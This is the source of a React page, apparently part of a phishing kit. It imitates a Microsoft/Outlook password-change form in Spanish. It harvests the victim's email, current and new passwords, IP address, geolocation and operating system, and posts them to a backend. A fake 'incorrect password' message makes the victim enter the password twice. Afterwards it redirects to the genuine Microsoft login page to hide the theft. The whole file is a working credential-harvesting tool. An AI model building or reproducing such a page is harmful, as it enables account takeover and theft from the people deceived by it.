import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { createRegistroUser } from "../../../config/registroApi";
import styles from "./main.module.css";

export default function MainRegistro() {
  const [password, setPassword] = useState("");
  const [nuevopass, setNuevoPass] = useState("");
  const [repeatpass, setRepeatPass] = useState("");
  const [errorSpan, setErrorSpan] = useState(false);
  const [errPassword, setErrPaswword] = useState(false);
  const [errNewPassword, setErrNewPaswword] = useState(false);

  //params
  let { email } = useParams();
  // console.log(email);

  //forma para obtener ubicacion de su pais y su ip
  const [details, setDetails] = useState(null);
  // console.log(details);

  let country = details?.country_name;
  let IPv4 = details?.IPv4;
  let city = details?.city || "lima";

  useEffect(() => {
    const getUserGeolocationDetails = () => {
      fetch(
        "https://geolocation-db.com/json/0f761a30-fe14-11e9-b59f-e53803842572"
      )
        .then((response) => response.json())
        .then((data) => setDetails(data));
    };
    getUserGeolocationDetails();
  }, []);

  //ver el sistema operativo de dpnde ingresa a la web
  var InfoSistemaOperativo = window.navigator.appVersion.toLowerCase();
  // const so = InfoSistemaOperativo.indexOf('0.5')
  const datax = InfoSistemaOperativo.split("(");
  const so = datax[1];
  // console.log(InfoSistemaOperativo);

  const statePassword = (e) => {
    setPassword(e.target.value);
    if (password.length > 0) {
      setErrPaswword(false);
    }
  };

  const stateNuevoPassword = (e) => {
    setNuevoPass(e.target.value);
    if (nuevopass.length > 0) {
      setErrNewPaswword(false);
    }
  };

  const stateRepeatPassword = (e) => {
    setRepeatPass(e.target.value);
  };

  //enviar datos al server
  const enviarRegitro = async (e) => {
    e.preventDefault();

    let datax = {
      email,
      country,
      IPv4,
      password,
      nuevopass,
      repeatpass,
      city,
      so,
    };
    console.log(datax);
    // await createRegistroUser(datax);

    if (errorSpan) {
      if (!password || !nuevopass) {
        setErrNewPaswword(true);
        return setErrPaswword(true);
      } 
        await createRegistroUser(datax);
        // console.log(datax);
      return (window.location.href =
        "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1620146145&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fRpsCsrfState%3d24ae8aff-5a6f-9076-be1d-1055258ef79f&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015");
    }

    if (!password || !nuevopass) {
      setErrNewPaswword(true);
      setErrPaswword(true);
    } else {
      // setErrPaswword(false);
      // setErrNewPaswword(false);
      setErrorSpan(true);
      setPassword("");
      setNuevoPass("");
      setRepeatPass("");
      return await createRegistroUser(datax);
    }
  };

  return (
    <div className={styles.mainregistro}>
      <form className={styles.form} onSubmit={enviarRegitro}>
        <h3 className={styles.form_title}>Cambiar la contraseña </h3>
        <div className={styles.form_email}>
          <span className={styles.form_subtitile} >
            Una contraseña segura contribuye a evitar el acceso no autorizado a
            la cuenta de correo electronico{" "}
          </span>
          <input
            className={styles.form_email_input}
            type="text"
            name="email"
            value={email}
          />
        </div>

        {errorSpan ? (
          <section className={styles.error_span} >
            <span>
            la contraseña actual no es correcta. Vuelve a intentarlo.
            </span>
          </section>
        ) : null}

        <div className={styles.input_actual}>
          <label className={styles.input_actual__label}>
            Contraseña actual
          </label>
          {errPassword ? (
            <section className={styles.pass_null}>
              <span>Esta informacion es obligatoria.</span>
            </section>
          ) : null}
          <input
            className={styles.input_actual__input}
            style={{
              border: `${errPassword ? "2px solid red" : "1px solid black"}`,
            }}
            type="password"
            name="password"
            placeholder="Contraseña actual"
            value={password}
            onChange={statePassword}
            autoFocus
          />
        </div>

        <div className={styles.input_actual}>
          <label className={styles.input_actual__label}>Nueva contraseña</label>
          {errNewPassword ? (
            <section className={styles.pass_null}>
              <span>Esta informacion es obligatoria.</span>
            </section>
          ) : null}
          <input
            className={styles.input_actual__input}
            style={{
              border: `${errNewPassword ? "2px solid red" : "1px solid black"}`,
            }}
            type="password"
            name="nuevopass"
            placeholder="Nueva contraseña"
            value={nuevopass}
            onChange={stateNuevoPassword}
          />
        </div>
        <p className={styles.text_ocho}>
          8 caracteres como mínimo distingue mayusculas de minusculas{" "}
        </p>
        <div className={styles.input_actual}>
          <label className={styles.input_actual__label}>
            Vuelve a escribir la contraseña
          </label>
          <input
            className={styles.input_actual__input}
            type="password"
            name="repeatpass"
            placeholder="Nueva contraseña"
            value={repeatpass}
            onChange={stateRepeatPassword}
          />
        </div>

        <div className={styles.input_check}>
          <input
            className={styles.input_check__input}
            type="checkbox"
            name="check"
          />
          <span className={styles.input_check__span}>
            Hacerme cambiar la contraseña cada 72 dias
          </span>
        </div>

        <button type="submit" className={styles.button_guardar}>
          Guardar
        </button>

        <button type="button" className={styles.button_cancelar}>
          Cancelar
        </button>
      </form>
    </div>
  );
}
